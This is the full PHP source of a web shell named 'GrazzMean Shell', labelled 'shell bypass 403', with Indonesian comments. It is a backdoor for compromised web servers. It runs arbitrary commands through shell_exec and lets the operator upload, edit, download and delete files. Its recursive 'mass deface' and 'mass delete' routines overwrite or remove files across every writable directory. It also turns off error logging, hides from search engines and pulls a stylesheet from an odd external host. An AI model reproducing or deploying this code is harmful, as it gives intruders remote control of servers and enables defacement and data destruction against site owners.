<?php
/* Mau recode? izin dulu, recode ga izin itu ga keren ajg */
set_time_limit(0);
error_reporting(0); 
@ini_set('error_log',null);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);
date_default_timezone_set('Asia/Jakarta');
$_n = 'GrazzMean';
$_s = "<style>table{display:none;}</style><div class='table-responsive'><hr></div>";
$_r = "required='required'";
$_x = "<i class='bi bi-menu-up'></i>";
if(isset($_GET['option']) && $_POST['opt'] == 'download'){
	header('Content-type: text/plain');
	header('Content-Disposition: attachment; filename="'.$_POST['name'].'"');
echo(file_get_contents($_POST['path']));
exit();
}
function ▟($path,$p) {
if(isset($_GET['path'])) {
	$▚ = $_GET['path'];
}else{
	$▚ = getcwd();
}
if(is_writable($▚)) {
	return "<gr class='anu'>".$p."</gr>";
}else{
	return "<rd class='anu'>".$p."</rd>";
	}
}
function ok(){
	echo '<div class="alert alert-success alert-dismissible fade show my-3" role="alert"><button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>';
}
function er(){
	echo '<div class="alert alert-danger alert-dismissible fade show my-3" role="alert"><button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>';
}
function sz($byt){
	$sz = array('B','KB','MB','GB','TB');
	for($i = 0; $byt >= 1024 && $i < (count($sz) -1 ); $byt /= 1024, $i++ );
	return(round($byt,2)." ".$sz[$i]);
}
function ip() {
	$ipas = '';
if(getenv('HTTP_CLIENT_IP'))
	$ipas = getenv('HTTP_CLIENT_IP');
else if(getenv('HTTP_X_FORWARDED_FOR'))
	$ipas = getenv('HTTP_X_FORWARDED_FOR');
else if(getenv('HTTP_X_FORWARDED'))
	$ipas = getenv('HTTP_X_FORWARDED');
else if(getenv('HTTP_FORWARDED_FOR'))
	$ipas = getenv('HTTP_FORWARDED_FOR');
else if(getenv('HTTP_FORWARDED'))
	$ipas = getenv('HTTP_FORWARDED');
else if(getenv('REMOTE_ADDR'))
	$ipas = getenv('REMOTE_ADDR');
else
	$ipas = 'IP tidak dikenali';
return $ipas;
}
function p($file){
if($p = @fileperms($file)){
	$i = 'u';
if(($p & 0xC000) == 0xC000)$i = 's';
elseif(($p & 0xA000) == 0xA000)$i = 'l';
elseif(($p & 0x8000) == 0x8000)$i = '-';
elseif(($p & 0x6000) == 0x6000)$i = 'b';
elseif(($p & 0x4000) == 0x4000)$i = 'd';
elseif(($p & 0x2000) == 0x2000)$i = 'c';
elseif(($p & 0x1000) == 0x1000)$i = 'p';
	$i .= ($p & 00400)? 'r':'-';
	$i .= ($p & 00200)? 'w':'-';
	$i .= ($p & 00100)? 'x':'-';
	$i .= ($p & 00040)? 'r':'-';
	$i .= ($p & 00020)? 'w':'-';
	$i .= ($p & 00010)? 'x':'-';
	$i .= ($p & 00004)? 'r':'-';
	$i .= ($p & 00002)? 'w':'-';
	$i .= ($p & 00001)? 'x':'-';
return $i;
	}
	else return "- ?? -";
}
$disfunc = @ini_get("disable_functions");
if(empty($disfunc)) {
	$disfc = "<gr>NONE</gr>";
}else{
	$disfc = "<rd>$disfunc</rd>";
}
if(!function_exists('posix_getegid')) {
	$user = @get_current_user();
	$uid = @getmyuid();
	$gid = @getmygid();
	$group = "?";
}else{
	$uid = @posix_getpwuid(posix_geteuid());
	$gid = @posix_getgrgid(posix_getegid());
	$user = $uid['name'];
	$uid = $uid['uid'];
	$group = $gid['name'];
	$gid = $gid['gid'];
}
$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "<rd>ON</rd>" : "<gr>OFF</gr>";
echo "
<!DOCTYPE HTML>
<html>
	<head>
		<meta name='author' content='$_n'>
		<meta name='robots' content='noindex,nofollow'>
		<title>".$_SERVER['HTTP_HOST']." - $_n</title>
		<meta name='viewport' content='width=device-width, initial-scale=0.70'>
		<link rel='stylesheet' href='//meki.google.co.ws/style.css'>
		<script src='//cdnjs.cloudflare.com/ajax/libs/prism/1.6.0/prism.js'></script>
		<script src='//cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/js/bootstrap.bundle.min.js'></script>
		<script src='//code.jquery.com/jquery-3.3.1.slim.min.js'></script>
	</head>
<body class='bg-secondary text-light'>
<div class='container-fluid'>
	<div class='py-3' id='main'>
		<div class='box shadow bg-dark p-4 rounded-3'>
			<div class='corner text-secondary anu'>shell bypass 403</div>
				<a class='text-decoration-none text-light anu' href='".$_SERVER['PHP_SELF']."'><h4>$_n Shell</h4></a>";
				if(isset($_GET['path'])){
					$path = $_GET['path'];
				}else{
					$path = getcwd();
				}
					$path = str_replace('\\','/',$path);
					$paths = explode('/',$path);
				foreach($paths as $id=>$pat){
				if($pat == '' && $id == 0){
					$a = true;
					echo '<div class="table-responsive"><i class="bi bi-hdd-rack"></i> : <a class="text-decoration-none text-light" href="?path=/">/</a>';
				continue;
				}
				if($pat == '') continue;
					echo '<a class="text-decoration-none" href="?path=';
				for($i=0;$i<=$id;$i++){
					echo "$paths[$i]";
				if($i != $id) echo "/";
				}
				echo '">'.$pat.'</a>/';
				}
				echo " [ ".▟($path, p($path))." ]</div>";
			echo "
		</div>
	</div>
</div>
<div class='container-fluid'>
	<div class='box shadow bg-dark p-4 rounded-3'>
		<div class='corner anu'>
			<b data-bs-toggle='collapse' data-bs-target='#collapseExample' aria-expanded='false' aria-controls='collapseExample'><i class='bi bi-info-circle'></i> info server <i class='bi bi-chevron-down'></i></b>
		</div>
	<div class='collapse text-dark mb-3' id='collapseExample'>
		<div class='box shadow bg-light p-4 rounded-3'>
			Uname: <gr>".php_uname()."</gr><br />
			Software: <gr>".$_SERVER['SERVER_SOFTWARE']."</gr><br />
			PHP version: <gr>".PHP_VERSION."</gr> <a class='text-decoration-none' href='?phpinfo&path=$path'>[ PHP INFO ]</a> PHP os: <gr>".PHP_OS."</gr><br />
			Server Ip: <gr>".gethostbyname($_SERVER['HTTP_HOST'])."</gr><br />
			Your Ip: <gr>".ip()."</gr><br />
			User: <gr>$user</gr> ($uid) | Group: <gr>$group</gr> ($gid)<br />
			Safe Mode: $sm<br />
			Disable Function:<div class='table-responsive'>$disfc</div>
		</div>
	</div>
<div class='text-center'>
	<div class='btn-group'>
		<a class='btn btn-outline-light btn-sm' href='?upload&path=$path'><i class='bi bi-upload'></i> upload</a>
		<a class='btn btn-outline-light btn-sm' href='?mass_deface&path=$path'><i class='bi bi-exclamation-diamond'></i> mass deface</a>
		<a class='btn btn-outline-light btn-sm' href='?mass_delete&path=$path'><i class='bi bi-trash'></i> mass delete</a>
		<a class='btn btn-outline-light btn-sm' href='?cmd&path=$path'><i class='bi bi-terminal'></i> console</a>
	</div>
</div>";
// tools nya
if(isset($_GET['path'])) {
	$dir = $_GET['path'];
	chdir($dir);
}else{
	$dir = getcwd();
}
$dir = str_replace("\\","/",$dir);
$scdir = explode("/", $dir);	
for($i = 0; $i <= $c_dir; $i++) {
	$scdir[$i];
	if($i != $c_dir) {
}
if(isset($_GET['mass_deface'])) {
echo "$_s";
function mass_kabeh($dir,$namafile,$isi_script) {
if(is_writable($dir)) {
	$dira = scandir($dir);
	foreach($dira as $dirb) {
		$dirc = "$dir/$dirb";
		$▚ = $dirc.'/'.$namafile;
		if($dirb === '.') {
			file_put_contents($▚, $isi_script);
		} elseif($dirb === '..') {
			file_put_contents($▚, $isi_script);
		}else{
			if(is_dir($dirc)) {
				if(is_writable($dirc)) {
					echo "[<gr><i class='bi bi-check-all'></i></gr>]&nbsp;$▚<br>";
					file_put_contents($▚, $isi_script);
					$▟ = mass_kabeh($dirc,$namafile,$isi_script);
					}
				}
			}
		}
	}
}
function mass_biasa($dir,$namafile,$isi_script) {
	if(is_writable($dir)) {
		$dira = scandir($dir);
		foreach($dira as $dirb) {
			$dirc = "$dir/$dirb";
			$▚ = $dirc.'/'.$namafile;
			if($dirb === '.') {
				file_put_contents($▚, $isi_script);
			} elseif($dirb === '..') {
				file_put_contents($▚, $isi_script);
			}else{
				if(is_dir($dirc)) {
					if(is_writable($dirc)) {
						echo "[<gr><i class='bi bi-check-all'></i></gr>]&nbsp;$dirb/$namafile<br>";
						file_put_contents($▚, $isi_script);
					}
				}
			}
		}
	}
}
if($_POST['start']) {
	if($_POST['tipe'] == 'massal') {
	mass_kabeh($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
	} elseif($_POST['tipe'] == 'biasa') {
	mass_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
	}
}
echo "
<div class='mb-3'>
	<form method='POST'> Tipe:
	<div class='form-check'>
		<input class='form-check-input' type='checkbox' value='biasa' name='tipe' id='flexCheckDefault' checked>
		<label class='form-check-label' for='flexCheckDefault'>Biasa</label>
	</div>
	<div class='form-check'>
		<input class='form-check-input' type='checkbox' value='massal' name='tipe' id='flexCheckDefault'>
		<label class='form-check-label' for='flexCheckDefault'>Massal</label>
	</div>
		<i class='bi bi-folder'></i> Lokasi:
		<input class='form-control btn-sm' type='text' name='d_dir' value='$dir'>
		<i class='bi bi-file-earmark'></i> Nama file:
		<input class='form-control btn-sm' type='text' name='d_file' placeholder='nama file' $_r>
		<i class='bi bi-file-earmark'></i> Isi file:
		<textarea class='form-control btn-sm' rows='7' name='script' placeholder='isi file' $_r></textarea>
		<div class='d-grid gap-2'>
			<input class='btn btn-outline-light btn-sm' type='submit' name='start' value='mass deface'>
		</div>
	</form>
</div>";
}
if(isset($_GET['mass_delete'])) {
echo "$_s";
function hapus_massal($dir,$namafile) {
if(is_writable($dir)) {
	$dira = scandir($dir);
	foreach($dira as $dirb) {
		$dirc = "$dir/$dirb";
		$▚ = $dirc.'/'.$namafile;
		if($dirb === '.') {
			if(file_exists("$dir/$namafile")) {
				unlink("$dir/$namafile");
			}
		} elseif($dirb === '..') {
			if(file_exists("".dirname($dir)."/$namafile")) {
				unlink("".dirname($dir)."/$namafile");
			}
		}else{
			if(is_dir($dirc)) {
				if(is_writable($dirc)) {
					if(file_exists($▚)) {
						echo "[<gr><i class='bi bi-check-all'></i></gr>]&nbsp;$▚<br>";
						unlink($▚);
						$▟ = hapus_massal($dirc,$namafile);
						}
					}
				}
			}
		}
	}
}
if($_POST['start']) {
	hapus_massal($_POST['d_dir'], $_POST['d_file']);
}
echo "
<div class='mb-3'>
	<form method='POST'>
		<i class='bi bi-folder'></i> Lokasi:
		<input class='form-control btn-sm' type='text' name='d_dir' value='$dir'>
			<i class='bi bi-file-earmark'></i> Nama file:
		<div class='input-group mb-3'>
			<input class='form-control btn-sm' type='text' name='d_file' placeholder='nama file' $_r><br>
		<div class='input-group-append'>
			<input class='btn btn-outline-light btn-sm' type='submit' name='start' value='mass delete'>
		</div>
	</form>
</div>";
}
if(isset($_GET['cmd'])) {
if(!empty($_POST['cmd'])) {
	$cmd = shell_exec($_POST['cmd'].' 2>&1');
}
echo "$_s
<div class='mb-3'>
	<form method='POST'>
		<div class='input-group mb-3'>
			<input class='form-control btn-sm' type='text' name='cmd' value='".htmlspecialchars($_POST['cmd'], ENT_QUOTES, 'UTF-8')."' placeholder='whoami' $_r>
			<button class='btn btn-outline-light btn-sm' type='sumbit'><i class='bi bi-arrow-return-right'></i></button>
		</div>
	</form>";
	if($cmd):
	echo '
	<div class="container-fluid language-javascript">
		<div class="shell mb-3">
			<pre style="font-size:10px;"><code>'.htmlspecialchars($cmd, ENT_QUOTES, 'UTF-8').'</code></pre>
		</div>
	</div>';
	elseif(!$cmd && $_SERVER['REQUEST_METHOD'] == 'POST'):
	echo '
	<div class="container-fluid language-javascript">
		<div class="shell mb-3">
			<pre style="font-size:10px;"><code>Tidak ada hasil</code></pre>
		</div>
	</div>
</div>';
endif;
}
if(isset($_GET['phpinfo'])) {
	@ob_start();
	@eval("phpinfo();");
	$buff = @ob_get_contents();
	@ob_end_clean();	
	$awal = strpos($buff,"<body>")+6;
	$akhir = strpos($buff,"</body>");
	echo "<b><pre class='php_info anu'>".substr($buff,$awal,$akhir-$awal)."</pre></b>";
	exit;
}
if(isset($_GET['upload'])) {
echo "$_s";
if(isset($_POST['upl'])){
	$hasil = count($_FILES['file']['name']);
	for($isi=0;$isi<$hasil;$isi++){
		$namafile = $_FILES['file']['name'][$isi];
			$up = @copy($_FILES['file']['tmp_name'][$isi],"$path/".$namafile);
		}
		if($hasil < 2){
			if($up){
			echo "<strong>Upload</strong> $namafile ok! ".ok()."</div>";
		}else{
		echo '<strong>Upload</strong> gagal! '.er().'</div>';
		}
	}else{
	echo "<strong>Upload</strong> $hasil ok! ".ok()."</div>";
	}
}
echo "
<div class='mb-3'>
	<form method='POST' enctype='multipart/form-data'>
		<div class='input-group mb-3'>
			<input class='form-control form-control-sm' type='file' name='file[]' multiple='' $_r>
			<input class='btn btn-outline-light btn-sm' type='submit' name='upl' value='upload'>
		</div>
	</form>
</div>";
}
if(isset($_GET['filebaru'])) {
echo "$_s";
if(isset($_POST['bikin'])){
	$name = $_POST['nama_file'];
	$isi_file = $_POST['isi_file'];
	foreach ($name as $nama_file){
		$handle = @fopen("$nama_file", "w");
		if($isi_file){
			$buat = @fwrite($handle, $isi_file);
		}else{
			$buat = $handle;
		}
	}
	if($buat){
		echo "<script>window.location='?path=$path'</script>";
	}else{
		echo '<strong>Buat file</strong> gagal! '.er().'</div>';
		}
	}
echo "
<div class='mb-3'>
	<form method='POST'>
		<i class='bi bi-file-earmark'></i> Nama file:
		<input class='form-control form-control-sm' type='text' name='nama_file[]' placeholder='Nama file' $_r>
		<i class='bi bi-file-earmark'></i> Isi file:
		<textarea class='form-control form-control-sm' name='isi_file' rows='7' placeholder='Isi file' $_r ></textarea>
		<div class='d-grid gap-2'>
			<input class='btn btn-outline-light btn-sm' type='submit' name='bikin' value='buat'>
		</div>
	</form>
</div>";
}
if(isset($_GET['dirbaru'])) {
echo "$_s";
if(isset($_POST['buat'])){
	$nama = $_POST['nama_dir'];
	foreach ($nama as $nama_dir){
		$folder = preg_replace("([^\w\s\d\-_~,;:\[\]\(\].]|[\.]{2,})", '', $nama_dir);
		$fd = @mkdir ($folder);
	}
	if($fd){
		echo "<script>window.location='?path=$path'</script>";
	}else{
		echo '<strong>Buat dir</strong> gagal! '.er().'</div>';
		}
	}
echo "
<div class='mb-3'>
	<form method='POST'>
		<i class='bi bi-folder'></i> Nama dir:
		<div class='input-group mb-3'>
			<input class='form-control form-control-sm' type='text' name='nama_dir[]' placeholder='Nama dir' $_r>
			<input class='btn btn-outline-light btn-sm' type='submit' name='buat' value='buat'>
		</div>
	</form>
</div>";
	}
}
// akhir tools
if(isset($_GET['filesrc'])){
echo "<br><b>name : </b>".basename($_GET['filesrc']);"</br>";
echo '
<div class="container-fluid language-javascript">
	<div class="shell mb-3">
		<pre style="font-size:12px;"><code>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</code></pre>
	</div>
</div>';
} elseif(isset($_GET['option']) && $_POST['opt'] != 'hapus'){
echo '<br><b>name : </b>'.basename($_POST['path']);'</br>';
// file
if($_POST['opt'] == 'ganti_nama'){
if(isset($_POST['nama_baru'])){
if(rename($_POST['path'],$path.'/'.$_POST['nama_baru'])){
echo "<script>window.location='?path=$path'</script>";
	}else{
echo '<strong>Ganti nama</strong> gagal! '.er().'</div>';
}
$_POST['name'] = $_POST['nama_baru'];
}
echo '
<form method="POST">
	<div class="input-group mb-3">
		<input class="form-control form-control-sm" name="nama_baru" type="text" value="'.$_POST['name'].'" />
			<input type="hidden" name="path" value="'.$_POST['path'].'">
		<input type="hidden" name="opt" value="ganti_nama">
		<input class="btn btn-outline-light btn-sm" type="submit" value="ganti nama"/>
	</div>
</form>';
} elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<strong>Edit</strong> ok! '.ok().'</div>';
	}else{
echo '<strong>Edit</strong> gagal! '.er().'</div>';
}
fclose($fp);
}
echo '
<div class="mb-3">
	<form method="POST">
		<textarea class="form-control form-control-sm mb-3" rows="7" name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea>
			<input type="hidden" name="path" value="'.$_POST['path'].'">
			<input type="hidden" name="opt" value="edit">
		<div class="d-grid gap-2">
			<input class="btn btn-outline-light btn-sm" type="submit" value="edit"/>
		</div>
	</form>
</div>';
	}
}else{
//hapus dir & file
if(isset($_GET['option']) && $_POST['opt'] == 'hapus'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
	echo "<script>window.location='?path=$path'</script>";
	}else{
	echo '<strong>Hapus dir</strong> gagal! '.er().'</div>';
	}
} elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
	echo "<script>window.location='?path=$path'</script>";
	}else{
	echo '<strong>Hapus file</strong> gagal! '.er().'</div>';
		}
	}
}
$scandir = scandir($path);
$pa = getcwd();
echo '
<div class="table-responsive">
<table class="table table-hover table-dark text-light">
<thead>
<tr>
	<td class="text-center">name</td>
		<td class="text-center">last edit</td>
		<td class="text-center">size</td>
		<td class="text-center">owner<gr>:</gr>downer</td>
		<td class="text-center">permission</td>
	<td class="text-center">options</td>
</tr>
</thead>
<tbody class="text-nowrap">
<tr>
	<td><i class="bi bi-folder2-open"></i><a class="text-decoration-none text-secondary" href="?path='.dirname($dir).'">..</a></td><td></td><td></td><td></td><td></td><td class="text-center">
		<div class="btn-group">
			<a class="btn btn-outline-light btn-sm" href="?filebaru&path='.$dir.'"><i class="bi bi-file-earmark-plus-fill"></i></a>
			<a class="btn btn-outline-light btn-sm" href="?dirbaru&path='.$dir.'"><i class="bi bi-folder-plus"></i></a>
		</div>
	</td>
</tr>';
foreach($scandir as $dir){
	$dt = date("Y-m-d H:i:s", filemtime("$path/$dir"));
	if(function_exists('posix_getpwuid')) {
		$downer = @posix_getpwuid(fileowner("$path/$dir"));
		$downer = $downer['name'];
	}else{
		$downer = fileowner("$path/$dir");
	}
	if(function_exists('posix_getgrgid')) {
		$dgrp = @posix_getgrgid(filegroup("$path/$dir"));
		$dgrp = $dgrp['name'];
	}else{
		$dgrp = filegroup("$path/$dir");
	}
if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
echo "
<tr>
	<td><i class='bi bi-folder-fill'></i><a class='text-decoration-none text-secondary' href=\"?path=$path/$dir\">$dir</a></td>
	<td class='text-center'>$dt</td>
	<td class='text-center'>-</td>
	<td class='text-center'>$downer<gr>:</gr>$dgrp</td>
	<td class='text-center'>";
if(is_writable("$path/$dir")) echo '<gr>';
elseif(!is_readable("$path/$dir")) echo '<rd>';
echo p("$path/$dir");
if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</gr></rd></td>';
echo "
	<td class=\"text-center\">
	<form method=\"POST\" action=\"?option&path=$path\">
		<div class=\"btn-group\">
			<button class=\"btn btn-outline-light btn-sm\" name=\"opt\" value=\"ganti_nama\"><i class='bi bi-pencil-fill'></i></button>
			<button class=\"btn btn-outline-light btn-sm\" name=\"opt\" value=\"hapus\"><i class='bi bi-trash-fill'></i></button>
		</div>
		<input type=\"hidden\" name=\"type\" value=\"dir\">
		<input type=\"hidden\" name=\"name\" value=\"$dir\">
		<input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
	</form>
	</td>
</tr>";
}
foreach($scandir as $file){
	$ft = date("Y-m-d H:i:s", filemtime("$path/$file"));
	if(!is_file($path.'/'.$file)) continue;
	if(function_exists('posix_getpwuid')) {
		$fowner = @posix_getpwuid(fileowner("$path/$file"));
		$fowner = $fowner['name'];
	}else{
		$fowner = fileowner("$path/$file");
	}
	if(function_exists('posix_getgrgid')) {
		$fgrp = @posix_getgrgid(filegroup("$path/$file"));
		$fgrp = $fgrp['name'];
	}else{
		$fgrp = filegroup("$path/$file");
	}
echo "
<tr>
	<td><i class='bi bi-file-earmark-code-fill'></i><a class='text-decoration-none text-secondary' href=\"?filesrc=$path/$file&path=$path\">$file</a></td>
	<td class='text-center'>$ft</td>
	<td class='text-center'>".sz(filesize($file))."</td>
	<td class='text-center'>$fowner<gr>:</gr>$fgrp</td>
	<td class='text-center'>";
if(is_writable("$path/$file")) echo '<gr>';
elseif(!is_readable("$path/$file")) echo '<rd>';
echo p("$path/$file");
if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</gr></rd></td>';
echo "
	<td class=\"text-center\">
		<form method=\"POST\" action=\"?option&path=$path\">
			<div class=\"btn-group\">
				<button class=\"btn btn-outline-light btn-sm\" name=\"opt\" value=\"edit\"><i class='bi bi-pencil-square'></i></button>
				<button class=\"btn btn-outline-light btn-sm\" name=\"opt\" value=\"ganti_nama\"><i class='bi bi-pencil-fill'></i></button>
				<button class=\"btn btn-outline-light btn-sm\" name=\"opt\" value=\"download\"><i class='bi bi-download'></i></button>
				<button class=\"btn btn-outline-light btn-sm\" name=\"opt\" value=\"hapus\"><i class='bi bi-trash-fill'></i></button>
			</div>
			<input type=\"hidden\" name=\"type\" value=\"file\">
			<input type=\"hidden\" name=\"name\" value=\"$file\">
			<input type=\"hidden\" name=\"path\" value=\"$path/$file\">
		</form>
	</td>
</tr>";
	}
}
?>
</tbody>
</table>
<div class='text-secondary'>&copy; <?php echo " ".date('Y')." $_n";?></div>
</div>
</div>
</body>
</html>
